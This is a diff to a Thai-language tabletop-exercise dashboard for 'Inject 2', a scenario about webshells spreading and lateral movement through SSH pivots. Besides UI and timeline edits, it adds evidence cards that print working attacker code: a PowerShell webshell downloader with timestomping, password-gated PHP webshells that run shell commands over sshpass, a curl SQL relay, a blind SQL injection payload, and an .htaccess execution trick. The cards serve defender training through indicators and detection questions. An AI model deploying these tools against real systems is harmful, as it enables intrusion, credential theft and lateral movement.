@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Inject 2: WebShell + Credential Exfil — TTX User Dashboard</title>
+<title>Inject 2: WebShell ระบาด + Lateral Movement (SSH Pivot) — TTX User Dashboard</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Thai:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <script>
@@ -280,8 +280,12 @@ body {
 }
 .tab-btn:hover { color: var(--text); background: var(--hover-bg); }
 .tab-btn.active { color: white; background: var(--accent); border-bottom-color: var(--accent); }
-.tab-content { display: none; animation: tabFadeIn 0.15s ease; }
+.tab-content { display: none; }
 .tab-content.active { display: block; }
+/* Fade-in runs only after the page has painted once (body.is-ready is set by JS)
+   so the first view does not blink/flash when the page opens.
+   Normal tab switches still get the smooth fade. */
+body.is-ready .tab-content.active { animation: tabFadeIn 0.15s ease; }
 @keyframes tabFadeIn { from { opacity: 0; } to { opacity: 1; } }
 
 /* ===== Cards ===== */
@@ -490,6 +494,9 @@ pre {
     transition-duration: 0.01ms !important;
     scroll-behavior: auto !important;
   }
+  /* Disable the tab fade entirely for reduced-motion so no opacity:0
+     first-frame is painted (prevents flash/blink on tab switch). */
+  body.is-ready .tab-content.active { animation: none !important; }
 }
 </style>
 </head>
@@ -510,11 +517,12 @@ pre {
 <main class="main">
   <!-- ===== Inject Header ===== -->
   <div class="inject-header" style="background:var(--orange-header);border-color:var(--orange-header-border)">
-    <h2><span class="badge badge-orange">&#9679; ORANGE</span>&nbsp; Inject 2: WebShell + Credential Exfil — ฝัง webshell และขโมยข้อมูลเข้าสู่ระบบ</h2>
+    <h2><span class="badge badge-orange">&#9679; ORANGE</span>&nbsp; Inject 2: WebShell ระบาด + Lateral Movement (SSH Pivot) — กระจาย webshell ผ่าน SSH pivot และเคลื่อนที่ภายในเครือข่าย</h2>
     <div class="meta">
-      <span>&#128337; 10:45 – 12:15 (90 นาที)</span>
+      <span>&#128337; 10:45 - 12:15 (90 นาที)</span>
       <span>&#127919; Phase: Discovery / Lateral Movement</span>
       <span>&#128200; ระดับ: ร้ายแรง</span>
+      <span style="font-weight:600;color:var(--orange)">&#9200; ช่วงเวลาข้างล่างเป็นเวลาจำลองเหตุการณ์ (Simulated Time) ไม่ใช่เวลาสล็อตการฝึก</span>
     </div>
   </div>
 
@@ -534,23 +542,23 @@ pre {
         <p style="color:var(--text);line-height:1.8">
           หลังจากวาง webshells บน 192.168.2.35 ได้สำเร็จ ผู้โจมตีเริ่มขยับไปยังระบบอื่น:
         </p>
-        <p style="color:var(--text);line-height:1.8;margin-top:12px;font-weight:600">Phase 2a: Network Scanning (13:10-13:25)</p>
+        <p style="color:var(--text);line-height:1.8;margin-top:12px;font-weight:600">Phase 2a: Network Scanning (12:40-12:50)</p>
         <ul style="color:var(--text);line-height:1.8;margin-top:4px;padding-left:20px">
           <li>สร้าง port scanner (<span class="highlight-orange">lanprobe628405.php</span>, <span class="highlight-orange">lanprobe628406.php</span>) สแกน subnet 192.168.x.x</li>
           <li>สร้าง system recon tool (<span class="highlight-orange">netx628409.php</span>) — ดึงข้อมูลระบบผ่าน php_uname(), phpinfo()</li>
         </ul>
-        <p style="color:var(--text);line-height:1.8;margin-top:12px;font-weight:600">Phase 2b: SSH Pivoting (13:32-13:44)</p>
+        <p style="color:var(--text);line-height:1.8;margin-top:12px;font-weight:600">Phase 2b: SSH Pivoting (12:50-13:00)</p>
         <ul style="color:var(--text);line-height:1.8;margin-top:4px;padding-left:20px">
           <li>สร้าง SSH tunneling tools 4 ตัว (<span class="highlight-orange">sshx628413.php</span>, <span class="highlight-orange">sshask628414-16.php</span>)</li>
           <li>ใช้ <span class="highlight-red">sshpass</span> และ SSH_ASKPASS เพื่อ SSH ไปยังระบบอื่นโดยไม่ต้อง interact</li>
         </ul>
-        <p style="color:var(--text);line-height:1.8;margin-top:12px;font-weight:600">Phase 2c: Deep Lateral Movement (15:12-15:31)</p>
+        <p style="color:var(--text);line-height:1.8;margin-top:12px;font-weight:600">Phase 2c: Deep Lateral Movement (13:00-13:12)</p>
         <ul style="color:var(--text);line-height:1.8;margin-top:4px;padding-left:20px">
           <li>สร้าง HTTP proxy (<span class="highlight-red">ews1628426.php</span>) — ใช้ 192.168.2.35 เป็น proxy ไปยังระบบอื่น</li>
           <li>สร้าง SRM exploitation tool (<span class="highlight-red">srmx628425.php</span>)</li>
         </ul>
         <p style="color:var(--text);line-height:1.8;margin-top:12px">
-          &#8220;ผู้เข้าร่วม ควรตรวจจับและจัดการกับการขยับข้ามระบบเหล่านี้อย่างไร?&#8221;
+          &#8220;ผู้เข้าร่วมควรตรวจจับและจัดการกับการขยับข้ามระบบเหล่านี้อย่างไร?&#8221;
         </p>
       </div>
     </div>
@@ -594,6 +602,15 @@ if(isset($_GET['pwd']) &amp;&amp; $_GET['pwd'] === 'dada9527'){
 }
 ?&gt;</pre>
         </div>
+      </div>
+      <div style="margin-top:12px;background:var(--green-box-bg);border:1px solid var(--green-box-border);border-radius:var(--radius-sm);padding:14px">
+        <p style="font-size:13px;font-weight:600;color:var(--green);margin-bottom:6px">&#128269; ข้อสังเกต: sshpass ไม่อยู่ใน approved baseline / software allowlist</p>
+        <p style="font-size:13px;color:var(--text-muted);line-height:1.7">
+          <code style="color:var(--green)">sshpass</code> ไม่ใช่ package ที่ติดตั้งใน standard baseline ของ 192.168.2.35 —
+          การปรากฏของ <code style="color:var(--green)">sshpass</code> (ติดตั้งเพิ่ม ~12:51 ตาม yum history)
+          ตรวจจับได้จาก <span style="font-family:'JetBrains Mono',monospace;font-size:12px">yum history / rpm -Va</span>
+          หรือ Software Inventory (OSQuery/FIM) ที่เทียบกับ allowlist — จุดนี้เป็น detection gap ที่ทีมควรสังเกตได้
+        </p>
       </div>
     </div>
     <div class="card">
@@ -661,11 +678,11 @@ if(isset($_GET['pwd']) &amp;&amp; $_GET['pwd'] === 'dada9527'){
       </div>
     </div>
     <div class="card">
-      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน B-4: PowerShell Deploy Script</h3>
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน B-4: PowerShell Deploy Script (deploymf2.ps1)</h3>
       <div class="evidence-block">
-        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; deploymf.ps1</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; deploymf2.ps1</span><span class="arrow">&#9654;</span></div>
         <div class="evidence-body">
-          <pre># ไฟล์: deploymf.ps1 — PowerShell Webshell Mass Deployment
+          <pre># ไฟล์: deploymf2.ps1 — PowerShell Webshell Mass Deployment (variant)
 # พบที่: 192.168.2.18 (Division — Windows / XAMPP)
 
 # ดาวน์โหลด webshell จาก deploy source
@@ -679,17 +696,149 @@ $targetSites = @(
 )
 
 foreach($site in $targetSites) {
-    $targetPath = "C:\inetpub\wwwroot\$site\wp-includes\user_helper.php"
+    $targetPath = "C:\xampp\htdocs\$site\wp-includes\user_helper.php"
     
     # ดาวน์โหลด webshell
     Invoke-WebRequest -Uri $source -OutFile $targetPath
     
-    # Timestomp — ตั้ง timestamp ให้ดูเหมือนไฟล์ปกติ
-    (Get-Item $targetPath).CreationTime = "2024-01-15 08:30:00"
-    (Get-Item $targetPath).LastWriteTime = "2024-01-15 08:30:00"
+    # Timestomp — ตั้ง timestamp ให้ดูเหมือนไฟล์ปกติ (ใช้ local path เพื่อให้ SetCreationTime ทำงานได้จริง)
+    (Get-Item $targetPath).CreationTime = "2025-03-15 10:22:33"
+    (Get-Item $targetPath).LastWriteTime = "2025-03-15 10:22:33"
 }
 
-Write-Host "Deployed to $($targetSites.Count) sites"</pre>
+Write-Host "Deployed to $($targetSites.Count) sites"
+</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน B-5: Windows Sysmon — PowerShell Download + Timestomp</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; sysmon_event_1.log (excerpt)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># Sysmon EventID 1 (Process Create) — 192.168.2.18 (Division / Windows Server 2019)
+# Log: Microsoft-Windows-Sysmon/Operational (raw event, field ตาม format Sysmon)
+
+TimeCreated: 2026-07-12 13:04:52.481
+User: NT AUTHORITY\SYSTEM
+CommandLine: powershell -NoP -NonI -W Hidden -c Invoke-WebRequest -Uri http://192.168.2.45/knowledge/phocadownload/KM2/usermf.php -OutFile C:\xampp\htdocs\wad\wp-includes\user_helper.php
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ProcessId: 4821
+ParentImage: C:\Windows\System32\svchost.exe (WinRM)
+
+TimeCreated: 2026-07-12 13:04:55.910
+CommandLine: powershell -NoP -NonI -W Hidden -c (Get-Item C:\xampp\htdocs\wad\wp-includes\user_helper.php).CreationTime='2025-03-15 10:22:33';(Get-Item C:\xampp\htdocs\wad\wp-includes\user_helper.php).LastWriteTime='2025-03-15 10:22:33'
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ProcessId: 4835
+</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน B-6: System Recon Tool (netx628409.php)</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; netx628409.php (excerpt)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre>// ไฟล์: netx628409.php — System Reconnaissance
+// พบที่: 192.168.2.35 (Intranet)
+// สร้าง: ~12:48 (Phase 2a — หลัง LAN scan)
+
+&lt;?php
+if(isset($_GET['pwd']) &amp;&amp; $_GET['pwd'] === 'dada9527'){
+    echo "UNAME: " . php_uname() . "\n";
+    echo "PHP: " . phpversion() . "\n";
+    echo "PWD: " . getcwd() . "\n";
+    phpinfo();
+}
+?&gt;</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน B-7: SSH_ASKPASS Tools (sshask628414-16.php)</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; sshask628414.php (excerpt)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre>// ไฟล์: sshask628414.php, sshask628415.php, sshask628416.php — SSH_ASKPASS variant
+// พบที่: 192.168.2.35 (Intranet)
+// สร้าง: ~12:52 (Phase 2b — เตรียมไว้ใช้กับหลาย hosts)
+
+&lt;?php
+if(isset($_GET['pwd']) &amp;&amp; $_GET['pwd'] === 'dada9527'){
+    $host = $_GET['h']; $user = $_GET['u']; $pass = $_GET['p']; $cmd = $_GET['c'];
+    // ใช้ SSH_ASKPASS + sshpass เพื่อตอบ password อัตโนมัติแม้ไม่มี tty (CentOS 7 / OpenSSH 7.4 — sshpass ตอบ password ได้เองโดยไม่ต้องพึ่ง force option)
+    $ssh = "SSH_ASKPASS=/tmp/askpass.sh " .
+           "sshpass -p '" . $pass . "' ssh -o StrictHostKeyChecking=no " .
+           $user . "@" . $host . " '" . $cmd . "'";
+    echo shell_exec($ssh);
+}
+?&gt;
+</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน B-8: MySQL Query Tool (sqlx628407.php)</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; sqlx628407.php (excerpt)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre>// ไฟล์: sqlx628407.php — MySQL Query / phpMyAdmin Helper
+// พบที่: 192.168.2.35 (Intranet)
+// สร้าง: 12:58 (ท้าย Phase 2b — ก่อนโจมตี SRM 13:15)
+
+&lt;?php
+if(isset($_GET['pwd']) &amp;&amp; $_GET['pwd'] === 'dada9527'){
+    $url = $_GET['url'];
+    $sql = $_GET['sql'];
+    // ส่ง SQL ผ่านตัวกลางที่เชื่อม MySQL ได้ (เช่น phpMyAdmin ที่เข้าถึงได้จากภายนอก (122.154.9.157 — Inject 3))
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, "sql=" . urlencode($sql));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    echo curl_exec($ch);
+}
+?&gt;</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน B-9: SRM Exploitation Tool (srmx628425.php)</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; srmx628425.php (excerpt)</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre>// ไฟล์: srmx628425.php — SRM Login SQL Injection (XPATH / Boolean-blind)
+// พบที่: 192.168.2.35 (Intranet)
+// สร้าง: ~13:05 (Phase 2c — ก่อนการโจมตี SRM 13:15)
+
+&lt;?php
+if(isset($_GET['pwd']) &amp;&amp; $_GET['pwd'] === 'dada9527'){
+    $url = "http://192.168.11.27/srm/log_in/log_in.php";
+    // Boolean-blind: ถอด credential ทีละ character
+    $chars = "abcdefghijklmnopqrstuvwxyz0123456789._@!";
+    foreach (str_split($chars) as $c) {
+        $payload = "admin' and substring((select password from srm_users limit 1),1,1)='" . $c . "'-- -";
+        // ส่ง POST + เปรียบเทียบ response จนกว่าจะตรง แล้วต่อตัวถัดไป
+    }
+}
+?&gt;</pre>
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#128269; หลักฐาน B-10: .htaccess Placement Script (place.ps1)</h3>
+      <div class="evidence-block">
+        <div class="evidence-title" onclick="toggleEvidence(this)"><span>&#128196; place.ps1</span><span class="arrow">&#9654;</span></div>
+        <div class="evidence-body">
+          <pre># ไฟล์: place.ps1 — วาง .htaccess + ตรวจสอบ webshell ทำงาน
+# พบที่: 192.168.2.18 (Division — Windows / XAMPP)
+
+# วาง .htaccess ให้ execute .phtml เป็น PHP
+$htaccess = "AddType application/x-httpd-php .phtml"
+Set-Content -Path "C:\xampp\htdocs\eba\.htaccess" -Value $htaccess
+
+# ตรวจสอบว่า webshell ตอบสนอง (คาดหวัง HTTP 404 เนื่องจาก camouflage)
+Invoke-WebRequest -Uri "http://192.168.2.18/eba/go4_bg.phtml?pwd=dada9527&amp;c=whoami" -UseBasicParsing
+</pre>
         </div>
       </div>
     </div>
@@ -707,6 +856,10 @@ Write-Host "Deployed to $($targetSites.Count) sites"</pre>
         <div class="ioc-item">
           <div class="ioc-label" style="color:var(--red)">HTTP Proxy</div>
           <div class="ioc-value">ews1628426.php (SSL_VERIFYPEER=false)</div>
+        </div>
+        <div class="ioc-item">
+          <div class="ioc-label" style="color:var(--orange)">SRM Exploitation</div>
+          <div class="ioc-value">srmx628425.php, sqlx628407.php</div>
         </div>
         <div class="ioc-item">
           <div class="ioc-label" style="color:var(--orange)">LAN Scanner</div>
@@ -730,7 +883,7 @@ Write-Host "Deployed to $($targetSites.Count) sites"</pre>
         </div>
         <div class="ioc-item">
           <div class="ioc-label" style="color:var(--text-dim)">Timestomp Targets</div>
-          <div class="ioc-value">CreationTime/LastWriteTime set to 2024-01-15</div>
+          <div class="ioc-value">CreationTime/LastWriteTime set to 2025-03-15</div>
         </div>
       </div>
       <div style="margin-top:16px">
@@ -755,6 +908,23 @@ Write-Host "Deployed to $($targetSites.Count) sites"</pre>
   <div class="tab-content" id="inj2-tab-questions">
     <div class="card">
       <h3 style="font-size:16px;font-weight:600;margin-bottom:16px">&#10067; คำถามสำหรับผู้เข้าร่วม</h3>
+      <div style="background:var(--surface-mid);border:1px solid var(--border);border-left:4px solid var(--green);border-radius:12px;padding:16px 20px;margin:10px 0">
+        <p style="font-size:13px;font-weight:600;color:var(--green);margin-bottom:6px">&#128221; หมายเหตุหลักฐาน: raw log vs reconstructed</p>
+        <p style="font-size:13px;color:var(--text-muted);line-height:1.8">
+          หลักฐานในชุดนี้เป็น 2 ประเภท เพื่อให้ผู้เข้าร่วมแยกแยะความน่าเชื่อถือของแหล่งข้อมูล:
+        </p>
+        <ul style="font-size:13px;color:var(--text-muted);line-height:1.8;padding-left:20px;margin-top:6px">
+          <li><strong style="color:var(--green)">RAW LOG</strong> — ข้อมูลจากระบบจริงโดยตรง เช่น
+            <span style="font-family:'JetBrains Mono',monospace;font-size:12px">nginx_access.log</span>,
+            <span style="font-family:'JetBrains Mono',monospace;font-size:12px">sysmon_event_1.log</span>,
+            <span style="font-family:'JetBrains Mono',monospace;font-size:12px">suricata_fast.log</span>,
+            <span style="font-family:'JetBrains Mono',monospace;font-size:12px">intraEvidence.txt</span></li>
+          <li><strong style="color:var(--orange)">RECONSTRUCTED / NARRATIVE</strong> — สร้างขึ้นเพื่อการฝึกจำลองจาก
+            MySQL general log / narrative summary เช่น
+            <span style="font-family:'JetBrains Mono',monospace;font-size:12px">srm_sql_injection.log</span>,
+            <span style="font-family:'JetBrains Mono',monospace;font-size:12px">phpmyadmin_access.log</span></li>
+        </ul>
+      </div>
       <div class="question-card">
         <div class="question-num">Q1</div>
         <div class="question-text">webshell ปลอมตัวเป็นไฟล์อะไร? ทำไมถึงอำพรางได้สำเร็จ? ควรค้นหา webshells อย่างไรบนเซิร์ฟเวอร์?</div>
@@ -781,7 +951,7 @@ Write-Host "Deployed to $($targetSites.Count) sites"</pre>
 </main>
 
 <footer class="footer">
-  Inject 2: WebShell + Credential Exfil — Operation Phantom Tide: Water Under Siege
+  Inject 2: WebShell ระบาด + Lateral Movement (SSH Pivot) — Operation Phantom Tide: Water Under Siege
 </footer>
 
 <script>
@@ -807,6 +977,21 @@ function toggleTheme() {
   setTheme(current, false);
   var btn = document.getElementById('themeToggle');
   if (btn) btn.addEventListener('click', toggleTheme);
+})();
+
+// ========== Tab Fade (no blink on first paint) ==========
+// Enable the tab fade-in animation only AFTER the initial paint, so the
+// first view does not blink/flash when the page opens.
+// Subsequent tab switches still animate normally.
+(function enableTabFadeAfterPaint() {
+  function markReady() { document.body.classList.add('is-ready'); }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function () {
+      requestAnimationFrame(function () { requestAnimationFrame(markReady); });
+    });
+  } else {
+    requestAnimationFrame(function () { requestAnimationFrame(markReady); });
+  }
 })();
 
 // ========== Tabs ==========
